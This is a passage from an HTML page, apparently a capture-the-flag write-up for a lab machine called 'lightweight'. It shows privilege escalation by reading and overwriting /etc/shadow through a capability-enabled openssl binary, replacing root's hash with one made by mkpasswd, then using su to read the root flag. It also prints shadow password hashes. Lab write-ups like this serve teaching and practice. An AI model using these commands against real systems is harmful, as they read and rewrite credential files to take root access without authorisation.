+                Last&nbsp;<span style="color:#ff9d00;font-weight:700">login:</span>&nbsp;Sat&nbsp;May&nbsp;11&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>04<span style="color:#ff9d00;font-weight:700">:</span>27&nbsp;2019&nbsp;from&nbsp;10.10.13.128<br>
+                [10.10.13.128@lightweight&nbsp;~]$&nbsp;curl&nbsp;-k&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>localhost<span style="color:#ff9d00;font-weight:700">:</span>9001<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>shadow<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        You should receive /etc/shadow!<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>6b) Modify /etc/shadow</strong></h3><br>
+        openssl can also upload/write to files, so you want to modify /etc/shadow.<br>
+        Read the root hash:<br>
+            <div class="codebox">
+                root<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$6$eVOz8tJs$xpjymy5BFFeCIHq9a</span>.BoKZeyPReKd7pwoXnxFNOa7TP5ltNmSDsiyuS<span style="color:#ff9d00;font-weight:700">/</span>ZqTgAGNEbx5jyZpCnbf8xIJ0Po6N8.
+            </div>
+        </div><br>
+        <br>
+        The format of the hashes in /etc/shadow is:<br>
+        $ID$SALT$ENCRYPTEDPASS<br>
+        <br>
+        $6 at the beginning means it's sha-512.<br>
+        Take note of the number of characters in the salt (up to 16)<br>
+        <br>
+        Now create a new root password using mkpasswd (I made root's password ‘smile’)<br>
+        (I used the same salt as in the original shadow file so it's not too obvious for other players):<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;mkpasswd&nbsp;-m&nbsp;sha-512&nbsp;-S&nbsp;eVOz8tJs&nbsp;-s<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;smile<br>
+                <span style="color:#7f0044;font-weight:400">$6$eVOz8tJs$n6sQ</span>.eS0RO8alN8RdILyBXb4BocpnY9gCf.u0aYUEwFgzH6KAVbbRd<span style="color:#ff9d00;font-weight:700">/</span>hPYgMgrZAlFS1eSMokXCbFfKQUBTIL<span style="color:#ff9d00;font-weight:700">/</span>
+            </div>
+        </div><br>
+        <br>
+        Replace root's original hash with the new hash you've just generated. Save it as shadow.modified.<br>
+        My shadow.modified looked like this (i.e. root has changed):<br>
+            <div class="codebox">
+                root<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$6$eVOz8tJs$n6sQ</span>.eS0RO8alN8RdILyBXb4BocpnY9gCf.u0aYUEwFgzH6KAVbbRd<span style="color:#ff9d00;font-weight:700">/</span>hPYgMgrZAlFS1eSMokXCbFfKQUBTIL<span style="color:#ff9d00;font-weight:700">/:</span>17711<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                bin<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                daemon<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                adm<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">lp:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">sync:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                shutdown<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                halt<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                mail<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                operator<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                games<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">ftp:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                nobody<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17632<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                systemd-network<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                dbus<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                polkitd<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                apache<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                libstoragemgmt<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                abrt<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                rpc<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                sshd<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                postfix<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                ntp<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                chrony<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                tcpdump<span style="color:#ff9d00;font-weight:700">:!!:</span>17689<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                ldap<span style="color:#ff9d00;font-weight:700">:!!:</span>17691<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                saslauth<span style="color:#ff9d00;font-weight:700">:!!:</span>17691<span style="color:#ff9d00;font-weight:700">::::::</span><br>
+                ldapuser1<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$6$OZfv1n9v$2gh4EFIrLW5hZEEzrVn4i8bYfXMyiPp2450odPwiL5yGOHYksVd8dCTqeDt3ffgmwmRYw49cMFueNZNOoI6A1</span>.<span style="color:#ff9d00;font-weight:700">:</span>17691<span style="color:#ff9d00;font-weight:700">:</span>365<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                ldapuser2<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX</span><span style="color:#ff9d00;font-weight:700">/</span>QEfjdRQzgn1<span style="color:#ff9d00;font-weight:700">:</span>17691<span style="color:#ff9d00;font-weight:700">:</span>365<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Open nano and copy/paste your modified /etc/shadow into a file:<br>
+            <div class="codebox">
+                [ldapuser1@lightweight&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>]$&nbsp;nano&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ldapuser1<span style="color:#ff9d00;font-weight:700">/</span>openssltmp<span style="color:#ff9d00;font-weight:700">/</span>shadow.modified
+            </div>
+        </div><br>
+        Now you just have to write the modified /etc/shadow to the system using openssl:<br>
+            <div class="codebox">
+                [ldapuser1@lightweight&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>]$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ldapuser1<span style="color:#ff9d00;font-weight:700">/</span>openssltmp<span style="color:#ff9d00;font-weight:700">/</span>shadow.modified&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ldapuser1<span style="color:#ff9d00;font-weight:700">/</span>openssl&nbsp;enc&nbsp;-out&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>shadow
+            </div>
+        </div><br>
+        <br>
+        And <code>su</code> to root!<br>
+            <div class="codebox">
+                [ldapuser1@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;root<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;smile<br>
+                [root@lightweight&nbsp;ldapuser1]#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;~<br>
+                [root@lightweight&nbsp;~]#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                addusers.sh &nbsp;base.ldif&nbsp;&nbsp;groups.ldif&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manageusers.sh&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">passwd</span>&nbsp;&nbsp;&nbsp;&nbsp;users.ldif<br>
+                anaconda-ks.cfg&nbsp;&nbsp;group &nbsp;&nbsp;&nbsp;&nbsp;manageusers.log&nbsp;&nbsp;openscap_data&nbsp;&nbsp;&nbsp;root.txt<br>
+                [root@lightweight&nbsp;~]#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;root.txt<br>
+                f1d4e309c5a6b3fffff74a8f4b2135fa
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
